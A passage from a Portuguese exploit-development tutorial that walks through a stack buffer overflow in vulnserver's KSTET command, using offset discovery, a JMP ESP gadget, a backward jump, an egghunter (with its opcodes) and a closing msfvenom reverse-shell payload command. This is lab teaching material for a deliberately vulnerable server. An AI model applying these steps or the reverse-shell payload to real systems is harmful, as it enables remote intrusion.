alt="" width="1120" height="956" class="lazyload" data-proofer-ignore></a></p><p>Agora que temos uma prova de conceito funcional, vamos aprofundar e determinar o tipo de overflow (se é uma substituição simples do EIP, SEH e etc...) e em que offset isso ocorre.</p><h3>0x03 - Determinando o tipo de Exploit e o Offset de controle</h3><p>Olhando na imagem (do immunity Debugger) podemos observar que o registrador EIP foi substituido por:</p><p>[sourcecode language="shell"]41414141<br /> [/sourcecode]</p><p>Se você está lendo nossos posts de forma sequencial ou ja realizou uma outra exploração de Buffer Overflow sabe que A (maiúsculo) corresponde ao hexa 41. Bom! agora sabemos que temos um stacked buffer overflow de simples substituição do EIP, ou também conhecido como <em>vanilla EIP overwrite</em>. Agora precisamos saber em que ponto do nosso 5000 bytes está ocorrendo a substiruição do EIP. Vamos usar uma ferramenta da <em>metasploit</em> para gerar um buffer único e depois identificar em quem ponsto a substituição ocorreu.</p><p>Gerando o buffer único:</p><p>[sourcecode language="shell"]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# msf-pattern_create -l 5000<br /> [/sourcecode]</p><p>Agora basta copiar e colar este buffer em nosso arquivo python conforme demonstrado abaixo:</p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/ 03-find_offset.py"></script></p><p>Execute este script e veja como ficou o registrador EIP:</p><p><a href="/assets/2019/02/03-2019-02-16_135338.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 505 319'%3E%3C/svg%3E" data-src="/assets/2019/02/03-2019-02-16_135338.png" alt="" width="505" height="319" class="lazyload" data-proofer-ignore></a></p><p>Agora basta usar o comando msf-pattern_offset com o valor de EIP para identificar a posição exata do buffer:</p><p>[sourcecode language="shell"]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# msf-pattern_offset -l 5000 -q 41326341<br /> [*] Exact match at offset 66<br /> [/sourcecode]</p><p>Isso indica que o EIP inicia no offset 66, ou seja, na posição 66, em outras palavras, temos 66 bytes de caracteres antes do EIP + 4 bytes do EIP e depois o restante do buffer. Vamos atualizar nosso exploit e verificar se temos o offset correto.</p><h3>0x04 - Verificando o Offset</h3><p>Vamos atualizar nosso exploit PoC com o tamanho do Offset conforme abaixo:<br /> <script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/ 04-checking_eip.py"></script></p><p>E executamos ele obtendo o resultado abaixo:</p><p><a href="/assets/2019/02/04-2019-02-16_135808-2.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 969'%3E%3C/svg%3E" data-src="/assets/2019/02/04-2019-02-16_135808-2.png" alt="" width="1116" height="969" class="lazyload" data-proofer-ignore></a></p><p>Isso indica que temos um exploit funcional que substituiu o EIP pelos nossos Bs, hexa 0x42, e que o ESP está apontado para o ponto exatamente posterior ao EIP, onde estão nossos Cs.</p><p>Porém olhando um pouco mais a fundo em nossa pilha de memória podemos ver que temos um numero limitado de Cs mesmo tendo enviado 500, este número é exatamente 20 bytes que pode ser calculado de 2 formas diferentes:</p><ol><li>Contando: Cada linha tem 4 bytes e no stack temos 5 linhas, então 4*5 = 20 bytes<li>Calculando: endereço inicial do stack 00FEF9F8, o primeiro caractere depois dos C está localizado em 00FEFA0C, então 00FEFA0C - 00FEF9F8 = 20 bytes</ol><p>Mas e dai que só tem 20 bytes? Isso indica que só teremos estes 20 bytes + os 66 bytes (antes do EIP) para realizar todo nosso processo de exploração, e um shellcode pequeno gerado pelo msfvenom tem pelo menos 354 bytes. Então teremos que ser criativos.</p><p><strong>Nota importante:</strong> Cuidado com os próximos passos para não continuar usando o buffer maior que 20 bytes após o endereço do EIP, pois isso causará problemas futuros.</p><h3>0x05 - Saltando para nosso Buffer</h3><p>O próximo passo em nosso processo de exploração será saltar para os nossos Cs, para isso precisaremos localizar um endereço de memória (sem o nullbyte 0x00) que faça o JMP ESP ou CALL ESP, podemos usar o script Mona para nos ajudar nessa tarefa. Note que vou utlizar o -n para ignorar os endereços iniciados por null byte.</p><p>[sourcecode language="shell"]!mona jmp -n -r ESP<br /> [/sourcecode]</p><p>Este comando nos retornou 9 opções</p><p><a href="/assets/2019/02/05-2019-02-17_095741.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 968'%3E%3C/svg%3E" data-src="/assets/2019/02/05-2019-02-17_095741.png" alt="" width="1116" height="968" class="lazyload" data-proofer-ignore></a></p><p>Porém a nossa escolha foi a primeira:</p><p>[sourcecode language="shell"]Log data, item 11<br /> Address=625011AF<br /> Message= 0x625011af : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)<br /> [/sourcecode]</p><p>Por hora não conhecemos nenhum badchar, a não ser os classisos para um servidor baseado em comandos ASCII (0x00 - null byte, 0x0d - '\r', 0x0a - '\n'). Adicionamente este endereço não tem outras proteções como SafeSEH e ASLR e é uma DLL do proprio sistema, o que facilita as coisas pois não corre-se o risco do endereço se alterar com a mudança de sistema operacional.</p><p>Então vamos atualizar nosso exploit para realizar esse JMP ESP. Nele utilizaremos uma função chamada pack da biblioteca struct para alterar o endereço entre big endian e little endian.</p><p>Segue nosso exploit atualizado:</p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/ 05-jumping-esp.py"></script></p><p>Antes de rodar nosso exploit novamente, no Immunity Debbuger clique no botão <strong><em>Goto address in Dissassembler </em></strong>demonstrado abaixo:</p><p><a href="/assets/2019/02/06-2019-02-16_150507.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1120 236'%3E%3C/svg%3E" data-src="/assets/2019/02/06-2019-02-16_150507.png" alt="" width="1120" height="236" class="lazyload" data-proofer-ignore></a></p><p>E digite o endereço da instrução JMP ESP escolhida:</p><p><a href="/assets/2019/02/06-2019-02-16_150539.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1120 274'%3E%3C/svg%3E" data-src="/assets/2019/02/06-2019-02-16_150539.png" alt="" width="1120" height="274" class="lazyload" data-proofer-ignore></a></p><p>Se certifique que está no endereço correto pois algumas vezes é necessário fazer este processo mais de uma vez para alcançar o endereço correto. Uma vez no endereço correto pressionne F2 para adicionar um breakpoint.</p><p><a href="/assets/2019/02/06-2019-02-16_150610.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1120 169'%3E%3C/svg%3E" data-src="/assets/2019/02/06-2019-02-16_150610.png" alt="" width="1120" height="169" class="lazyload" data-proofer-ignore></a></p><p>Agora execute o exploit e veja a aplicação parando no breakpoint selecionado</p><p><a href="/assets/2019/02/05-2019-02-17_101711.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 970'%3E%3C/svg%3E" data-src="/assets/2019/02/05-2019-02-17_101711.png" alt="" width="1116" height="970" class="lazyload" data-proofer-ignore></a></p><p>Observe que essa parada foi devido ao breakpoint, sabemos isso por causa do texto na barra de status "Breakpoint at essfunc.625011AF" e não outro erro como <em>access violation</em>.</p><p>Para dar continuidade pressione F7 (Step Into) para permitir o JMP para o endereço do ESP que por sua vez é a localização dos nossos Cs</p><p><a href="/assets/2019/02/05-2019-02-17_101916.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 969'%3E%3C/svg%3E" data-src="/assets/2019/02/05-2019-02-17_101916.png" alt="" width="1116" height="969" class="lazyload" data-proofer-ignore></a></p><h3>0x06 - Saltando para o buffer maior</h3><p>Até este ponto conseguimos saltar para o nosso ESP que é um buffer com 20 bytes, que não da p/ fazer quase nada, mas é mais que suficiente para que possamos fazer um salto para traz indo para nossos As que é um buffer um pouco maior (66 bytes)</p><p>Mas como fazemos isso? Há diversas formas, vamos explorar uma delas aqui, mas para isso precisamos saber onde estamos.</p><p>Olhando na imagem anterior vemos o seguinte cenário:</p><p>[sourcecode language="shell"]00EDF9F8 43 INC EBX<br /> [/sourcecode]</p><p>Estamos no endereço de memória 00EDF9F8. Mas onde está o início dos nossos As?</p><p>[sourcecode language="shell"]00EDF9B2 41 INC ECX<br /> [/sourcecode]</p><p>Então podemos fazer alguns cálculos para realizar a movimentação necessária</p><p>[sourcecode language="shell"]00EDF9F8 (Localização atual) - 00EDF9B2 (Posição desejada) = Valor em Hexa: 46 ou Valor em Decimal: 70<br /> [/sourcecode]</p><p>Para realizar os calculos do ESP de forma segura vamos colocar seu valor em EDX:</p><p>[sourcecode language="shell"]PUSH ESP<br /> POP EDX<br /> [/sourcecode]</p><p>E posteriormente subtrair 0x46 (decimal 70) de seu valor:</p><p>[sourcecode language="shell"]SUB EDX,0x46<br /> [/sourcecode]</p><p>E por fim saltar para o endereço desejado:</p><p>[sourcecode language="shell"]JMP EDX<br /> [/sourcecode]</p><p>Caso não esteja familiarizado o mestasploit tem uma ferramenta para nos ajudar neste processo de criação dos OPCODES chamada <em>msf-nasm_shell</em> conforme demonstrado abaixo:</p><p>[sourcecode language="shell"]root@M4v3r1cK:~# msf-nasm_shell<br /> nasm &amp;gt; PUSH ESP<br /> 00000000 54 push esp<br /> nasm &amp;gt; SUB EDX,0x46<br /> 00000000 83EA46 sub edx,byte +0x46<br /> nasm &amp;gt; JMP EDX<br /> 00000000 FFE2 jmp edx<br /> nasm &amp;gt;<br /> [/sourcecode]</p><p>Segue abaixo o exploit atualizado:</p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/06-stage1-option1.py"></script></p><p>Este é um dos métodos de realizar este processo, e o escolhido por mim neste exploit, porém há métodos mais econômicos do ponto de vista de consumo de espaço uma vez que temos somente 20 bytes. Como por exemplo o JUMP para 72 bytes para traz (70 bytes desejados + 2 consumido pela da instrução de JMP)</p><p>[sourcecode language="shell"]root@M4v3r1cK:~# msf-nasm_shell<br /> nasm &amp;gt; JMP short -72<br /> 00000000 EBB6 jmp short 0xffffffb8<br /> nasm &amp;gt;<br /> [/sourcecode]</p><p>Segue abaixo a segunda opção:<br /> Note que como neste nosso exploit nesse primeiro estágio só precisamos realizar o salto para nosso segundo estágio (nossos As) não faz diferença no método utilizado, mas caso precisasse realizar outras operações nestes restritos 20 bytes essa segunda opção certamente seria a melhor opção.</p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/06-stage1-option2.py"></script></p><p>Reiniciando o Immunity, redefinindo nosso breakpoint no commando JMP ESP e então pressionando F7 quando a execução parar no breakpoint chegaremos ao resultado abaixo:</p><p><a href="/assets/2019/02/06-2019-02-16_150857.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1120 955'%3E%3C/svg%3E" data-src="/assets/2019/02/06-2019-02-16_150857.png" alt="" width="1120" height="955" class="lazyload" data-proofer-ignore></a></p><p>Neste ponto temos pelo menos 2 formar de continuar com o exploit:</p><ol><li>Verificando a possibilidade de enviar o shellcode através de outro comando do servidor e buscando essa área de memória com egghunter<li>Reutilizando a função WS2_32.recv (que foi a função utilizada para ler nosso buffer inicial) para ler da nossa própria conexão um novo buffer (shellcode) e posteriormente executa-lo. Este processo está descrito no post <a href="https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-4-estudo-de-caso-vulnserver-kstet-com-reaproveitamento-da-funcao-ws2_32-recv/" target="_blank" rel="noopener noreferrer">Criação de Exploits – Parte 4 – Estudo de caso: vulnserver KSTET com reaproveitamento da função WS2_32 Recv </a></ol><p>Neste post abordaremos a opção 1: utilização de egghunter.</p><p><strong>0x07 - PoC2 Localizando o Shellcode<br /> </strong></p><p>Antes de dar continuidade ao processo de exploit primeiramente precisamos entender se será possível enviar o nosso shellcode através de outro comando para o servidor. Após diversos testes encontrei a função GDOG do servidor que permite o envio de pelo menos 1000 bytes, mais que suficiente para a colocação do nosso shellcode.</p><p>Para facilitar nosso teste no lugar doa 66 As vou colocar 66 0xCC (breakpoint), para que a aplicação pare a execução nele e possamos analisar a memória. Adicionalmente foi colocado no script um envio do nosso pseudo shellcode antes no buffer que irá causar o overflow, conforme exemplificado abaixo:</p><p>[sourcecode language="shell"]shellcode = b&quot;GDOG &quot;<br /> shellcode += &quot;T00WT00W&quot;<br /> shellcode += &quot;C&quot; * 1000</p><p>print &quot;[*] Enviando shellcode...&quot;</p><p>exp.recv(4096)<br /> exp.send(shellcode)</p><p>print &quot;[*] Enviando exploit...&quot;<br /> exp.recv(4096)<br /> exp.send(buffer)<br /> [/sourcecode]</p><p>Execute o exploit:<br /> <script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/07-poc2.py"></script></p><p>Note que como esperado a aplicação parou no breakpoint 0xCC:<br /> <a href="/assets/2019/02/07-2019-02-17_182547.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 969'%3E%3C/svg%3E" data-src="/assets/2019/02/07-2019-02-17_182547.png" alt="" width="1116" height="969" class="lazyload" data-proofer-ignore></a></p><p>Com a ajuda do script mona podemos verificar se foi encontrado na memória</p><p>[sourcecode language="shell"]!mona find -s T00WT00W<br /> [/sourcecode]</p><p>&nbsp;</p><p><a href="/assets/2019/02/07-2019-02-16_154941.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1120 234'%3E%3C/svg%3E" data-src="/assets/2019/02/07-2019-02-16_154941.png" alt="" width="1120" height="234" class="lazyload" data-proofer-ignore></a><br /> <a href="/assets/2019/02/07-2019-02-16_155003.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1120 955'%3E%3C/svg%3E" data-src="/assets/2019/02/07-2019-02-16_155003.png" alt="" width="1120" height="955" class="lazyload" data-proofer-ignore></a></p><p>Bom! Se o mona foi capaz de achar um egghunter escrito por nós também será.</p><h3>0x08 - Egghunter</h3><p>Egghunter é uma técnica utilizada onde temos um código relativamente pequeno +- 45 bytes que tem sua principal função buscar na memória um 'egg' que é na verdade nosso shellcode. É muito comum neste tipo de estudo você ver o termo T00W ou W00T, ele é uma regra? Não, ele é o que geralmente usamos para fins acadêmicos, mas pode ser qualquer sequencia de 4 bytes que será utilizada para identificar o inicio do nosso shellcode.</p><p>O Egghunter proposto neste post executa se forma simplificada o seguinte fluxo:</p><ol><li>Define o endereço de memória inicial da busca e salta para o passo 4;<li>Incrementa 4Kb ao endereço de memória atual e segue para o passo 4;<li>Incrementa 1 byte ao endereço de memória atual;<li>Verifica se tem acesso ao endereço de memória; Se sim salta para o passo 5; caso não salta para o passo 2;<li>Verifica se no endereço atual existe 1 instância do nosso EGG (W00T); Se existe continua a execução para o passo 6; caso contrário salta para o passo 3;<li>Verifica se nos próximos 4 bytes existe mais 1 instância do nosso EGG (W00T); Se sim faz um JMP para o byte seguinte do WOOTWOOT; caso não salta para o passo 3;</ol><p>Então vamos o nosso egghunter</p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/egghunter1.asm"></script></p><p>Para compilar ele e pegar o seu opcode para colocar em nosso python execute os comandos abaixo:</p><p>[sourcecode language="shell"]nasm egghunter1.asm -o egghunter -l egghunter.lst<br /> cat egghunter | msfvenom -p - -a x86 --platform win -e generic/none -f python<br /> [/sourcecode]</p><p>Tendo o seguinte resultado</p><p>[sourcecode language="shell"]Attempting to read payload from STDIN...<br /> Found 1 compatible encoders<br /> Attempting to encode payload with 1 iterations of generic/none<br /> generic/none succeeded with size 36 (iteration=0)<br /> generic/none chosen with final size 36<br /> Payload size: 36 bytes<br /> Final size of python file: 184 bytes<br /> buf = &quot;&quot;<br /> buf += &quot;\x89\xca\xeb\x06\x66\x81\xca\xff\x0f\x42\x52\x6a\x02&quot;<br /> buf += &quot;\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57&quot;<br /> buf += &quot;\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;<br /> [/sourcecode]</p><p>Basta agora copiar este código para nosso exploit. Para facilitar nosso estudo fiz uma alteração no exploit adicionando um breakpoint antes da chamada JMP EDI ficando como abaixo:</p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/08-egghunting.py"></script></p><p>Ao executar o nosso exploit ele irá parar na chamada no JMP EDI para que possamos verificar como estão nossos registradores, conforme imagem abaixo:<br /> <a href="/assets/2019/02/08-2019-02-17_190440.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 969'%3E%3C/svg%3E" data-src="/assets/2019/02/08-2019-02-17_190440.png" alt="" width="1116" height="969" class="lazyload" data-proofer-ignore></a></p><p>Pode-se observar que o EDI aponta para o endereço de memória</p><p>[sourcecode language="shell"]0x0027437D<br /> [/sourcecode]</p><p>Que per sua vez é o endereço exatamente posterior ao endereço do W00TW00T, você deve ter percebido que na memória o W00TW00T aparece como T00WT00W, isso ocorre em virtude do endianess.</p><h3>0x09 - Aproveite o shell</h3><p>Agora basta alterar os Cs para o shellcode gerado pelo msfvenom e aproveitar.</p><p>Gere o shellcode com o comando abaixo, nele coloquei como badchars os clássicos nullbyte, \r e \n.</p><p>[sourcecode language="shell"]msfvenom -p windows/shell_reverse_tcp lhost=192.168.15.177 lport=4444 -a x86 --platform win -e x86/alpha_mixed -b &quot;\x00\x0a\x0d&quot; -f python<br /> [/sourcecode]</p><p>Copie o conteúdo do buffer no exploit conforme arquivo abaixo e senha feliz!<br /> <script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/09-final.py"></script></p><p>&nbsp;</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/cria%C3%A7%C3%A3o-de-exploits/'>Criação de Exploits</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Criação de Exploits - Parte 3 - Estudo de caso: vulnserver KSTET com egghunter - Helvio Junior&url=https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-3-estudo-de-caso-vulnserver-kstet-com-egghunter/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Criação de Exploits - Parte 3 - Estudo de caso: vulnserver KSTET com egghunter - Helvio Junior&u=https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-3-estudo-de-caso-vulnserver-kstet-com-egghunter/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Criação de Exploits - Parte 3 - Estudo de caso: vulnserver KSTET com egghunter - Helvio Junior&url=https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-3-estudo-de-caso-vulnserver-kstet-com-egghunter/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-3-estudo-de-caso-vulnserver-kstet-com-egghunter/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/security/osint/localizando-ips-que-respondem-para-uma-url/">Localizando IPs que respondem para uma URL</a><li><a href="/security/osint/locating-url-ips-bypass-waf/">Locating IPs that respond to a URL</a><li><a href="/security/edr/instalando-elasticsearch-edr/">Instalando Elasticsearch EDR</a><li><a href="/it/instalando-openvpn-com-autenticacao-em-mysql/">Instalando OpenVPN com autenticação em MySQL</a><li><a href="/it/osce-osed-e-ecxd-certificacoes-de-desenvolvimento-de-exploits/">OSCE, OSED e eCXD: Certificações de desenvolvimento de Exploits</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/offensive-security/">Offensive Security</a> <a class="post-tag" href="/tags/pentest/">Pentest</a> <a class="post-tag" href="/tags/autoridade-certificadora/">autoridade certificadora</a> <a class="post-tag" href="/tags/ca/">ca</a> <a class="post-tag" href="/tags/certificate-authority/">certificate authority</a> <a class="post-tag" href="/tags/openssl/">openssl</a> <a class="post-tag" href="/tags/osce3/">OSCE3</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/osed/">OSED</a> <a class="post-tag" href="/tags/osee/">OSEE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/it/security/criacao-de-exploits/shellcoding-encontrando-endereco-da-funcao-dinamicamente-analise-da-biblioteca-block_api/"><div class="card-body"> <span class="timeago small" > Aug 15, 2021 <i class="unloaded">2021-08-15T16:26:52-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shellcoding - Encontrando endereço da função dinamicamente. Análise da biblioteca block_api</h3><div class="text-muted small"><p> Introdução Neste artigo iremos dissecar a biblioteca da Metasploit chamada Block API responsável por localizar em tempo de execução o endereço das funções dentro dos módulos carregados na aplicaçã...</p></div></div></a></div><div class="card"> <a href="/it/security/criacao-de-exploits/criacao-de-exploits-parte-0-um-pouco-de-teoria/"><div class="card-body"> <span class="timeago small" > Sep 30, 2018 <i class="unloaded">2018-09-30T17:45:47-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Criação de Exploits - Parte 0 - Um pouco de teoria</h3><div class="text-muted small"><p> Neste post irei inaugurar uma nova seção do site onde postarei uma série de tutoriais de como realizar a criação de exploits, a maioria deles, utilizando Buffer Overflow. Caso você deseje segue o l...</p></div></div></a></div><div class="card"> <a href="/it/security/criacao-de-exploits/como-realizar-stack-buffer-overflow/"><div class="card-body"> <span class="timeago small" > Sep 30, 2018 <i class="unloaded">2018-09-30T23:11:59-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Criação de Exploits - Parte 1 - Como realizar um Stack buffer overflow?</h3><div class="text-muted small"><p> Este post faz parte da série de criação de exploits, este é o segundo post dessa série, caso não tenha visto de uma olhada primeiramente na Parte 0 - Um pouco de teoria Segue abaixo os vídeos de d...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/it/security/criacao-de-exploits/criacao-de-exploits-parte-2-removendo-bad-chars-usando-immunity-debugger-e-mona/" class="btn btn-outline-primary" prompt="Older"><p>Criação de Exploits - Parte 2 - Removendo bad chars usando Immunity Debugger e Mona</p></a> <a href="/it/security/criacao-de-exploits/criacao-de-exploits-parte-4-estudo-de-caso-vulnserver-kstet-com-reaproveitamento-da-funcao-ws2_32-recv/" class="btn btn-outline-primary" prompt="Newer"><p>Criação de Exploits - Parte 4 - Estudo de caso: vulnserver KSTET com reaproveitamento da função WS2_32 Recv</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="text-center text-muted small pb-5"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> const options = { scriptUrl: '//.disqus.com/embed.js', disqusConfig: function() { this.page.title = 'Criação de Exploits - Parte 3 - Estudo de caso: vulnserver KSTET com egghunter'; this.page.url = 'https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-3-estudo-de-caso-vulnserver-kstet-com-egghunter/'; this.page.identifier = '/it/security/criacao-de-exploits/criacao-de-exploits-parte-3-estudo-de-caso-vulnserver-kstet-com-egghunter/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/helviojunior">Helvio junior (aka M4v3r1ck)</a>. <span data-toggle="tooltip" data-placement="top" title="Some rights reserved.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/offensive-security/">Offensive Security</a> <a class="post-tag" href="/tags/pentest/">Pentest</a> <a class="post-tag" href="/tags/autoridade-certificadora/">autoridade certificadora</a> <a class="post-tag" href="/tags/ca/">ca</a> <a class="post-tag" href="/tags/certificate-authority/">certificate authority</a> <a class="post-tag" href="/tags/openssl/">openssl</a> <a class="post-tag" href="/tags/osce3/">OSCE3</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/osed/">OSED</a> <a class="post-tag" href="/tags/osee/">OSEE</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://www.helviojunior.com.br{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
